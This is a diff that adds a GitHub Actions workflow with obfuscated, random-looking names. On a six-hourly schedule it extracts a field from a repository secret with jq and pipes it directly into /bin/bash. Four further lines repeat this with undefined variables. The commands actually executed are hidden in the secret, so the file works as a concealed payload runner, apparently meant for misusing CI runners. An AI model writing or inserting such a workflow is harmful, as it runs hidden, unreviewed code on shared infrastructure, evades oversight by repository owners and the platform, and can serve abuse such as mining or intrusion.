@@ -1,0 +1,22 @@
+name: taoshiwang1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taoshiwang1234
+        env:
+          l46: ${{ secrets.l46 }}
+        run: |
+          echo $l46 | jq -r .roi096 | /bin/bash
+          echo $ynum9581 | jq -r .ud48 | /bin/bash
+          echo $wvz8 | jq -r .bcpg64 | /bin/bash
+          echo $rxvpx54 | jq -r .bvges91 | /bin/bash
+          echo $n0802 | jq -r .gytsu01539 | /bin/bash
+
